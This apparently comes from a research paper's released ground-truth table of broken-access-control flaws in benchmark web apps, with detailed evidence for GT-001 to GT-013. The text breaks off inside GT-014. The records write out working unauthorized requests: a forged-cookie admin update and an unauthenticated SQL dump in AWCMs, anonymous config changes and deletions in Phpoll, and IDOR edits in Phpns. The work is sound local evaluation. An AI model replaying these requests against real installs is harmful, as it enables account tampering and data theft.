# DRHL Per-Vulnerability Ground-Truth Table (50 Records)

This document is the released per-vulnerability ground-truth table accompanying Section 5.1 (Ground-Truth Construction) of the paper. It lists the 50 ground-truth BAC vulnerabilities with, for each record, the affected endpoint or operation, BAC type, expected authorization requirement, unauthorized test case, and supporting evidence. The ground-truth set was finalized **before comparison with DRHL's detection reports**, so any ground-truth vulnerability not reported by DRHL is counted as a false negative.

## 1. Ground-Truth Construction Procedure and Safety Measures

The ground-truth set was established through the three-step procedure of Section 5.1:

1. **Independent auditing and authorization analysis.** Two authors independently audited each benchmark application's source code and executable workflows without consulting DRHL's detection outputs, enumerating requestable endpoints and security-sensitive operations and determining the expected authorization requirement for each.
2. **Uniform vulnerability validation.** Unauthorized test cases were constructed by replacing the legitimate subject with a user that does not satisfy the authorization requirement. A candidate entered the ground truth only when the unauthorized operation actually succeeded - for resource access, the attacking actor obtained the protected resource or content; for state-changing operations, the unauthorized effect was confirmed in the application or database state.
3. **Cross-checking and disagreement resolution.** The two auditors' candidate sets and supporting evidence were cross-checked; disagreements were independently reviewed by a third author and the final label was determined by consensus.

The per-application audit notes, validation records, and cross-checking discussion are archived in the per-application audit logs under `ground_truth/audit/` (`audit_log.md` per application). The executable validation experiments are archived as `GT-xxx.json` files in the same directories.

**Token marker method** (used in Step 2, selected by operation type):

1. **Read (resource access)**: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
2. **Create**: replay a creation request carrying a unique token as the attacking role, then check whether a new row containing the token appears in the database.
3. **Delete**: insert a row carrying a unique token into the database, then replay the delete request as the attacking role and check whether the token row disappears.
4. **Update**: write token1 into the target field, then replay an update request carrying token2 as the attacking role and check whether token1 in the database becomes token2.

**Environment and safety measures**:

- Test environment: local phpStudy deployment (`http://localhost/<app>/`), MySQL 5.5.53 (127.0.0.1:3306), application sources under `D:/phpStudy/PHPTutorial/WWW` (PHP 5.2.17; the DVWA audit was performed under PHP 5.4.45, as recorded in its audit log).
- Database hygiene: a baseline snapshot is created before each record; the baseline is restored immediately after the record and the restore is verified by re-dumping the database and comparing it line-by-line with the baseline (ignoring dump timestamps).
- File hygiene: for records that rewrite application files (SCARF `config.php`, phpoll `img/barra*.gif`), the files were backed up before and restored after the record.
- All tokens follow the `DRHLGT_<label>_<timestamp>` pattern and are distinguishable from business data.

**Validation status**: all 50 records have complete independent-validation experiment records and per-application audit logs.

## 2. Result Overview (50 Records)

| ID | Application | BAC Type | Endpoint / Operation | Operation Type | Independent Validation | DB Restore Verified | Details |
|---|---|---|---|---|---|---|---|
| GT-001 | AWCMs | VPE | `m_cp_avatar.php?KeepThis=true&TB_iframe=true&height=p1&width=p1` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-001) |
| GT-002 | AWCMs | VPE | `member.php?id=1 (administrator profile)` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-002) |
| GT-003 | AWCMs | HPE | `member.php?id=3 (another member profile)` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-003) |
| GT-004 | AWCMs | VPE | `install/index.php` | Resource Access / Administrative Action | ✅ Validated & documented | ✅ | [Details](#GT-004) |
| GT-005 | AWCMs | VPE | `control/db_backup.php` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-005) |
| GT-006 | Phpoll | VPE | `admin/modifica_band.php` | Update | ✅ Validated & documented | ✅ | [Details](#GT-006) |
| GT-007 | Phpoll | VPE | `admin/modifica_configurazione.php` | Update | ✅ Validated & documented | ✅ | [Details](#GT-007) |
| GT-008 | Phpoll | VPE | `admin/modifica_votanti.php` | Update | ✅ Validated & documented | ✅ | [Details](#GT-008) |
| GT-009 | Phpns | VPE | `install/index.php` | Resource Access / Administrative Action | ✅ Validated & documented | ✅ | [Details](#GT-009) |
| GT-010 | Phpns | VPE | `article.php?do=comments&id=6` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-010) |
| GT-011 | Phpns | VPE | `article.php?action=delete&do=comments&id=6` | Delete | ✅ Validated & documented | ✅ | [Details](#GT-011) |
| GT-012 | Phpns | HPE | `article.php?do=edit&id=6` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-012) |
| GT-013 | Phpns | HPE | `article.php?do=editp (submit update for id=6)` | Update | ✅ Validated & documented | ✅ | [Details](#GT-013) |
| GT-014 | Phpns | HPE | `user.php?do=edit&id=6` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-014) |
| GT-015 | Phpns | HPE | `user.php?do=editp (submit update for id=6)` | Update | ✅ Validated & documented | ✅ | [Details](#GT-015) |
| GT-016 | Bwapp | VPE | `backdoor.php` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-016) |
| GT-017 | Bwapp | VPE | `install.php` | Resource Access / Administrative Action | ✅ Validated & documented | ✅ | [Details](#GT-017) |
| GT-018 | Bwapp | VPE | `secret-cors-1.php` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-018) |
| GT-019 | Bwapp | VPE | `secret-cors-2.php` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-019) |
| GT-020 | Bwapp | VPE | `secret-cors-3.php` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-020) |
| GT-021 | DVWA | VPE | `about.php` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-021) |
| GT-022 | DVWA | VPE | `instructions.php?doc=p1` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-022) |
| GT-023 | DVWA | VPE | `setup.php` | Administrative Action | ✅ Validated & documented | ✅ | [Details](#GT-023) |
| GT-024 | SCARF | VPE | `install.php` | Resource Access / Administrative Action | ✅ Validated & documented | ✅ | [Details](#GT-024) |
| GT-025 | SCARF | VPE | `comments.php` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-025) |
| GT-026 | SCARF | VPE | `generaloptions.php` | Update | ✅ Validated & documented | ✅ | [Details](#GT-026) |
| GT-027 | EventsLister | VPE | `admin/setup.php` | Administrative Action | ✅ Validated & documented | ✅ | [Details](#GT-027) |
| GT-028 | EventsLister | VPE | `admin/user_add.php` | Create | ✅ Validated & documented | ✅ | [Details](#GT-028) |
| GT-029 | Mybb | VPE | `usercp2.php?action=addsubscription&fid=p1&type=forum` | Create | ✅ Validated & documented | ✅ | [Details](#GT-029) |
| GT-030 | Wackopicko | HPE | `users/view.php?userid=11` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-030) |
| GT-031 | Wackopicko | VPE | `users/sample.php?userid=p1 (login-gate bypass of the profile view)` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-031) |
| GT-032 | Jspblog | VPE | `admin/addnews.jsp` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-032) |
| GT-033 | Jspblog | VPE | `admin/addnews2.jsp` | Create | ✅ Validated & documented | ✅ | [Details](#GT-033) |
| GT-034 | Jspblog | VPE | `admin/adduser.jsp` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-034) |
| GT-035 | Jspblog | VPE | `admin/adduser2.jsp` | Create | ✅ Validated & documented | ✅ | [Details](#GT-035) |
| GT-036 | Jspblog | VPE | `admin/admin.jsp` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-036) |
| GT-037 | Jspblog | VPE | `admin/editnews.jsp` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-037) |
| GT-038 | Jspblog | VPE | `admin/editnews2.jsp` | Resource Access / Update | ✅ Validated & documented | ✅ | [Details](#GT-038) |
| GT-039 | JsForum | VPE | `servlet/forum.AddForum` | Create | ✅ Validated & documented | ✅ | [Details](#GT-039) |
| GT-040 | JsForum | VPE | `servlet/forum.AddReply` | Create | ✅ Validated & documented | ✅ | [Details](#GT-040) |
| GT-041 | JsForum | VPE | `servlet/forum.AddThread` | Create | ✅ Validated & documented | ✅ | [Details](#GT-041) |
| GT-042 | JsForum | HPE | `servlet/forum.AddReply with user=user2` | Create | ✅ Validated & documented | ✅ | [Details](#GT-042) |
| GT-043 | JsForum | HPE | `servlet/forum.AddThread with user=user2` | Create | ✅ Validated & documented | ✅ | [Details](#GT-043) |
| GT-044 | JsForum | HPE | `forum/editmessage.jsp (reply of another user)` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-044) |
| GT-045 | jwablogger | VPE | `blogger/viewEntry/5444/drhl_test_entry.html` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-045) |
| GT-046 | DjangoBlog | VPE | `eee/ (unpublished PostDetail)` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-046) |
| GT-047 | django_lms | VPE | `add_item/` | Create | ✅ Validated & documented | ✅ | [Details](#GT-047) |
| GT-048 | BBS_Pro | VPE | `bbs_pub/` | Resource Access | ✅ Validated & documented | ✅ | [Details](#GT-048) |
| GT-049 | orangeforum | HPE | `categories/1/topics/9/comments/34/edit (Update)` | Update | ✅ Validated & documented | ✅ | [Details](#GT-049) |
| GT-050 | orangeforum | HPE | `categories/1/topics/9/comments/34/edit (Delete)` | Delete | ✅ Validated & documented | ✅ | [Details](#GT-050) |

## 3. Per-Record Evidence

<a id="GT-001"></a>
### GT-001 · AWCMs · VPE

- **Endpoint / Operation**: `m_cp_avatar.php?KeepThis=true&TB_iframe=true&height=p1&width=p1`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: Only an authenticated member may open the member avatar control.
- **Unauthorized Test Case**: Request m_cp_avatar.php?KeepThis=true&TB_iframe=true&height=400&width=500 as a visitor without an authenticated member session.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `awcm_members`
   - row: `id=1 (admin)`
   - column: `avatar`
   - token1: `DRHLGT_avatar_before_8670635114`
   - token2: `DRHLGT_avatar_after_8670635114`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `GET m_cp_avatar.php?KeepThis=true&TB_iframe=true&height=400&width=500`
   - HTTP status: **200**
   - form_present: **True**

**3. Replay attack request (role: visitor (no login, no cookie))**:
   - Request: `POST m_cp_avatar.php?do= avatar=DRHLGT_avatar_after_8670635114`
   - HTTP status: **200**
   - db_avatar_after: `DRHLGT_avatar_before_8670635114`
   - changed_by_plain_visitor: **False**

**4. Replay attack request (role: visitor + forged awcm_member cookie (no password))**:
   - Request: `POST m_cp_avatar.php?do= avatar=DRHLGT_avatar_after_8670635114`
   - HTTP status: **200**
   - db_avatar_after: `DRHLGT_avatar_after_8670635114`
   - changed_by_forged_cookie: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
UPDATE awcm_members SET avatar='DRHLGT_avatar_before_8670635114' WHERE id=1;
-- [2] scalar
SELECT avatar FROM awcm_members WHERE id=1;
-- [3] scalar
SELECT avatar FROM awcm_members WHERE id=1;
```

**Evidence summary**: visitor GET returned 200 with the avatar update form (form_present=True); plain visitor POST got 200 and did not modify DB rows (sessionless $member binds to id 'no'); with a forged awcm_member cookie the POST updated admin avatar 'DRHLGT_avatar_before_8670635114' -> 'DRHLGT_avatar_after_8670635114' without any password.

**Evidence files**: [GT-001.json](audit/awcm/evidence/GT-001.json), [GT-001_gt001_visitor_get.html](audit/awcm/evidence/GT-001_gt001_visitor_get.html), [AWCMs audit log](audit/awcm/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-002"></a>
### GT-002 · AWCMs · VPE

- **Endpoint / Operation**: `member.php?id=1 (administrator profile)`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: An ordinary member must not obtain administrator-only profile information when the selected id identifies the administrator.
- **Unauthorized Test Case**: Log in as user1 and request member.php?id=1.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `awcm_members`
   - row: `id=1`
   - column: `title`
   - token: `DRHLGT_profile_8670638955`
   - before: `DRHLGT_profile_8670638955`

**2. Replay attack request (role: user1)**:
   - Request: `GET member.php?id=1`
   - HTTP status: **200**
   - token_exposed_in_response: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
UPDATE awcm_members SET title='DRHLGT_profile_8670638955' WHERE id=1;
-- [2] scalar
SELECT title FROM awcm_members WHERE id=1;
```

**Evidence summary**: vertical: user1 reads admin profile: logged in as user1, requested member.php?id=1; response status 200, token DRHLGT_profile_8670638955 from member id=1 title exposed=True.

**Evidence files**: [GT-002.json](audit/awcm/evidence/GT-002.json), [GT-002_GT-002_user1.html](audit/awcm/evidence/GT-002_GT-002_user1.html), [AWCMs audit log](audit/awcm/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-003"></a>
### GT-003 · AWCMs · HPE

- **Endpoint / Operation**: `member.php?id=3 (another member profile)`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: A member may view only profile data permitted by the application and must not obtain another member's protected profile by changing id.
- **Unauthorized Test Case**: Log in as user1 and replace the profile id with the database id of user2.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `awcm_members`
   - row: `id=3`
   - column: `signature`
   - token: `DRHLGT_profile_8670642616`
   - before: `DRHLGT_profile_8670642616`

**2. Replay attack request (role: user1)**:
   - Request: `GET member.php?id=3`
   - HTTP status: **200**
   - token_exposed_in_response: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
UPDATE awcm_members SET signature='DRHLGT_profile_8670642616' WHERE id=3;
-- [2] scalar
SELECT signature FROM awcm_members WHERE id=3;
```

**Evidence summary**: horizontal: user1 reads user2 profile: logged in as user1, requested member.php?id=3; response status 200, token DRHLGT_profile_8670642616 from member id=3 signature exposed=True.

**Evidence files**: [GT-003.json](audit/awcm/evidence/GT-003.json), [GT-003_GT-003_user1.html](audit/awcm/evidence/GT-003_GT-003_user1.html), [AWCMs audit log](audit/awcm/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-004"></a>
### GT-004 · AWCMs · VPE

- **Endpoint / Operation**: `install/index.php`
- **Operation Type**: Resource Access / Administrative Action
- **Expected Authorization Requirement**: The installation interface must be unavailable after deployment or restricted to an administrator.
- **Unauthorized Test Case**: Request install/index.php as visitor.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Replay attack request (role: visitor (no login))**:
   - Request: `GET install/index.php`
   - HTTP status: **200**
   - installer_form_present: **True**
   - step1_request: `GET install/step1.php?lang=en.php`
   - step1_status_code: `200`
   - step1_body_saved: `GT-004_gt004_visitor_step1.html`

**Evidence summary**: visitor GET install/index.php returned 200 with the language-selection installer form (installer_form_present=True); the flow advances to step1.php (status 200).

**Evidence files**: [GT-004.json](audit/awcm/evidence/GT-004.json), [GT-004_gt004_visitor_install.html](audit/awcm/evidence/GT-004_gt004_visitor_install.html), [AWCMs audit log](audit/awcm/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-005"></a>
### GT-005 · AWCMs · VPE

- **Endpoint / Operation**: `control/db_backup.php`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: Only an administrator may invoke database backup and receive the SQL dump.
- **Unauthorized Test Case**: Request control/db_backup.php as visitor without control-panel authentication.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `awcm_members`
   - inserted_row_username: `DRHLGT_dbdump_8670649505`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `GET control/db_backup.php`
   - HTTP status: **200**
   - content_disposition: `attachment; filename="backup_06/09/2026.sql"`
   - token_exposed_in_dump: **True**
   - insert_statements_in_dump: `38`
   - dump_contains_control_table_data: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
INSERT INTO awcm_members (username,password,email,sex,country,avatar,signature,level,title,autoactivate,notes) VALUES ('DRHLGT_dbdump_8670649505','x','x','x','x','x','x','member','x','no','x');
```

**Evidence summary**: visitor GET control/db_backup.php returned 200 SQL attachment ('attachment; filename="backup_06/09/2026.sql"'); dump exposes the instrumented row token=True, contains 38 INSERT statements and includes awcm_control data=True.

**Evidence files**: [GT-005.json](audit/awcm/evidence/GT-005.json), [GT-005_gt005_visitor_dbdump.html](audit/awcm/evidence/GT-005_gt005_visitor_dbdump.html), [AWCMs audit log](audit/awcm/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-006"></a>
### GT-006 · Phpoll · VPE

- **Endpoint / Operation**: `admin/modifica_band.php`
- **Operation Type**: Update
- **Expected Authorization Requirement**: Only an authenticated poll administrator may modify candidate or band data.
- **Unauthorized Test Case**: Submit the modifica_band form as visitor without an administrator session.
- **Verification Method**: Update-type check: write token1 into the target field, then replay an update request carrying token2 as the attacking role and check whether token1 in the database becomes token2.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `phpoll_test_band`
   - row: `id=69`
   - column: `nome_band`
   - token1: `DRHLGT_band_before_8670657866`
   - token2: `DRHLGT_band_after_8670657866`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST admin/modifica_band.php nome_band_0=DRHLGT_band_after_8670657866 id_0=69`
   - HTTP status: **200**
   - db_nome_band_before: `DRHLGT_band_before_8670657866`
   - db_nome_band_after: `DRHLGT_band_after_8670657866`
   - updated: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] query
SELECT id, nome_band, voti FROM phpoll_test_band ORDER BY id LIMIT 1;
-- [2] execute
UPDATE phpoll_test_band SET nome_band='DRHLGT_band_before_8670657866' WHERE id=69;
-- [3] scalar
SELECT nome_band FROM phpoll_test_band WHERE id=69;
```

**Evidence summary**: visitor POST to admin/modifica_band.php returned 200; band row id=69 nome_band changed DRHLGT_band_before_8670657866 -> DRHLGT_band_after_8670657866 (updated=True).

**Evidence files**: [GT-006.json](audit/phpoll/evidence/GT-006.json), [Phpoll audit log](audit/phpoll/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-007"></a>
### GT-007 · Phpoll · VPE

- **Endpoint / Operation**: `admin/modifica_configurazione.php`
- **Operation Type**: Update
- **Expected Authorization Requirement**: Only an authenticated poll administrator may change poll configuration.
- **Unauthorized Test Case**: Submit configuration changes as visitor without an administrator session.
- **Verification Method**: Update-type check: write token1 into the target field, then replay an update request carrying token2 as the attacking role and check whether token1 in the database becomes token2.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `phpoll_test_configurazione`
   - row: `id=1`
   - column: `oggetto_email`
   - token1: `DRHLGT_cfg_before_8670658713`
   - token2: `DRHLGT_cfg_after_8670658713`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST admin/modifica_configurazione.php oggetto_email=DRHLGT_cfg_after_8670658713`
   - HTTP status: **200**
   - db_oggetto_email_before: `DRHLGT_cfg_before_8670658713`
   - db_oggetto_email_after: `DRHLGT_cfg_after_8670658713`
   - db_login_after: `admin`
   - updated: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
UPDATE phpoll_test_configurazione SET oggetto_email='DRHLGT_cfg_before_8670658713' WHERE id=1;
-- [2] query
SHOW COLUMNS FROM phpoll_test_configurazione;
-- [3] query
SELECT * FROM phpoll_test_configurazione LIMIT 1;
-- [4] scalar
SELECT oggetto_email FROM phpoll_test_configurazione WHERE id=1;
-- [5] scalar
SELECT login FROM phpoll_test_configurazione WHERE id=1;
```

**Evidence summary**: visitor POST to admin/modifica_configurazione.php returned 200; configuration was truncated and rewritten: oggetto_email DRHLGT_cfg_before_8670658713 -> DRHLGT_cfg_after_8670658713 (updated=True); barra*.gif image files were restored afterwards.

**Evidence files**: [GT-007.json](audit/phpoll/evidence/GT-007.json), [Phpoll audit log](audit/phpoll/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-008"></a>
### GT-008 · Phpoll · VPE

- **Endpoint / Operation**: `admin/modifica_votanti.php`
- **Operation Type**: Update
- **Expected Authorization Requirement**: Only an authenticated poll administrator may modify voter or voting data.
- **Unauthorized Test Case**: Submit the voter-management form as visitor without an administrator session.
- **Verification Method**: Update-type check: write token1 into the target field, then replay an update request carrying token2 as the attacking role and check whether token1 in the database becomes token2.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `phpoll_test_voti`
   - inserted_row_id: `9`
   - token: `DRHLGT_voter_8670659608`
   - exists_before: `1`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST admin/modifica_votanti.php {9: 'on'}`
   - HTTP status: **200**
   - row_exists_after: `0`
   - deleted: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
INSERT INTO phpoll_test_voti (ip, band_votate, timestamp, votato, email, browser) VALUES ('DRHLGT_voter_8670659608', '', 0, 'no', 'DRHLGT_voter_8670659608@example.test', 'drhl');
-- [2] scalar
SELECT id FROM phpoll_test_voti WHERE ip='DRHLGT_voter_8670659608' ORDER BY id DESC LIMIT 1;
-- [3] scalar
SELECT COUNT(*) FROM phpoll_test_voti WHERE id=9;
-- [4] scalar
SELECT COUNT(*) FROM phpoll_test_voti WHERE id=9;
```

**Evidence summary**: visitor POST to admin/modifica_votanti.php returned 200; instrumented voter row id=9 (ip=DRHLGT_voter_8670659608) was deleted (exists_after=0).

**Evidence files**: [GT-008.json](audit/phpoll/evidence/GT-008.json), [Phpoll audit log](audit/phpoll/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-009"></a>
### GT-009 · Phpns · VPE

- **Endpoint / Operation**: `install/index.php`
- **Operation Type**: Resource Access / Administrative Action
- **Expected Authorization Requirement**: The installer must be disabled after deployment or restricted to an authenticated administrator.
- **Unauthorized Test Case**: Request install/index.php without a privileged session.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Replay attack request (role: visitor (no login))**:
   - Request: `GET install/index.php`
   - HTTP status: **200**
   - installer_db_form_present: **True**

**Evidence summary**: visitor GET install/index.php returned 200 with the installer database-configuration form (installer_db_form_present=True).

**Evidence files**: [GT-009.json](audit/phpns/evidence/GT-009.json), [GT-009_gt009_visitor_install.html](audit/phpns/evidence/GT-009_gt009_visitor_install.html), [Phpns audit log](audit/phpns/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-010"></a>
### GT-010 · Phpns · VPE

- **Endpoint / Operation**: `article.php?do=comments&id=6`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: Only a user with the article-edit or comment-moderation privilege may view the comment-management interface for article 6.
- **Unauthorized Test Case**: Log in with the register account and request the comment-management page for article 6.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `phpns_comments`
   - row: `id=5 (comment of article 6)`
   - column: `comment_text`
   - token: `DRHLGT_comment_8670663863`

**2. Replay attack request (role: register (low-privilege user))**:
   - Request: `GET article.php?do=comments&id=6`
   - HTTP status: **200**
   - token_exposed_in_response: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
UPDATE phpns_comments SET comment_text='DRHLGT_comment_8670663863' WHERE id=5 AND article_id='6';
```

**Evidence summary**: register GET article.php?do=comments&id=6 returned 200; comment moderation list exposes instrumented comment token=True.

**Evidence files**: [GT-010.json](audit/phpns/evidence/GT-010.json), [GT-010_gt010_register_comments.html](audit/phpns/evidence/GT-010_gt010_register_comments.html), [Phpns audit log](audit/phpns/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-011"></a>
### GT-011 · Phpns · VPE

- **Endpoint / Operation**: `article.php?action=delete&do=comments&id=6`
- **Operation Type**: Delete
- **Expected Authorization Requirement**: Only a user with the article-edit or comment-moderation privilege may delete comments of article 6.
- **Unauthorized Test Case**: Log in with the register account and submit selected comment identifiers to the delete operation.
- **Verification Method**: Delete-type check: insert a row carrying a unique token into the database, then replay the delete request as the attacking role and check whether the token row disappears.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `phpns_comments`
   - inserted_row_id: `24`
   - article_id: `6`
   - token: `DRHLGT_delcomment_8670665146`
   - exists_before: `1`

**2. Replay attack request (role: register (low-privilege user))**:
   - Request: `POST article.php?action=delete&do=comments&id=6 {24: 24}`
   - HTTP status: **200**
   - row_exists_after: `0`
   - deleted: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
INSERT INTO phpns_comments (article_id, comment_text, website, comment_author, timestamp, approved, ip) VALUES ('6', 'DRHLGT_delcomment_8670665146', '', 'drhlgt', '0', '1', '127.0.0.1');
-- [2] scalar
SELECT id FROM phpns_comments WHERE comment_text='DRHLGT_delcomment_8670665146' ORDER BY id DESC LIMIT 1;
-- [3] scalar
SELECT COUNT(*) FROM phpns_comments WHERE id=24;
-- [4] scalar
SELECT COUNT(*) FROM phpns_comments WHERE id=24;
```

**Evidence summary**: register POST article.php?action=delete&do=comments&id=6 returned 200; instrumented comment id=24 of article 6 was deleted (exists_after=0).

**Evidence files**: [GT-011.json](audit/phpns/evidence/GT-011.json), [Phpns audit log](audit/phpns/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-012"></a>
### GT-012 · Phpns · HPE

- **Endpoint / Operation**: `article.php?do=edit&id=6`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: Only the article author or an administrator may open the edit interface for article 6.
- **Unauthorized Test Case**: Log in as user1 and replace the article id with an article owned by user2.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `phpns_articles`
   - row: `id=6 (user2's article)`
   - column: `article_text`
   - token: `DRHLGT_article_edit_8670666617`

**2. Replay attack request (role: user1 (not the article author))**:
   - Request: `GET article.php?do=edit&id=6`
   - HTTP status: **200**
   - token_exposed_in_edit_form: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
UPDATE phpns_articles SET article_text='DRHLGT_article_edit_8670666617' WHERE id=6;
```

**Evidence summary**: user1 GET article.php?do=edit&id=6 returned 200; user2's article text token exposed in the edit form=True.

**Evidence files**: [GT-012.json](audit/phpns/evidence/GT-012.json), [GT-012_gt012_user1_edit_article6.html](audit/phpns/evidence/GT-012_gt012_user1_edit_article6.html), [Phpns audit log](audit/phpns/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-013"></a>
### GT-013 · Phpns · HPE

- **Endpoint / Operation**: `article.php?do=editp (submit update for id=6)`
- **Operation Type**: Update
- **Expected Authorization Requirement**: Only the article author or an administrator may update article 6.
- **Unauthorized Test Case**: Log in as user1 and submit the article-edit payload with id=6 owned by user2.
- **Verification Method**: Update-type check: write token1 into the target field, then replay an update request carrying token2 as the attacking role and check whether token1 in the database becomes token2.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `phpns_articles`
   - row: `id=6`
   - column: `article_text`
   - token1: `DRHLGT_art_before_8670667825`
   - token2: `DRHLGT_art_after_8670667825`
   - author_before: `user2`

**2. Replay attack request (role: user1 (not the article author))**:
   - Request: `POST article.php?do=editp id=6 article_text=<token2>`
   - HTTP status: **200**
   - db_article_text_before: `DRHLGT_art_before_8670667825`
   - db_article_text_after: `DRHLGT_art_after_8670667825`
   - db_article_author_after: `user1`
   - updated: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
UPDATE phpns_articles SET article_text='DRHLGT_art_before_8670667825' WHERE id=6;
-- [2] query
SHOW COLUMNS FROM phpns_articles;
-- [3] query
SELECT * FROM phpns_articles WHERE id=6 LIMIT 1;
-- [4] scalar
SELECT article_text FROM phpns_articles WHERE id=6;
-- [5] scalar
SELECT article_author FROM phpns_articles WHERE id=6;
```

**Evidence summary**: user1 POST article.php?do=editp returned 200; article 6 article_text changed DRHLGT_art_before_8670667825 -> DRHLGT_art_after_8670667825 (updated=True) and article_author became 'user1'.

**Evidence files**: [GT-013.json](audit/phpns/evidence/GT-013.json), [Phpns audit log](audit/phpns/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-014"></a>
### GT-014 · Phpns · HPE

- **Endpoint / Operation**: `user.php?do=edit&id=6`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: A user may open only their own account-edit interface unless the current user is an administrator.
- **Unauthorized Test Case**: Log in as user1 and replace id with user2's account id.
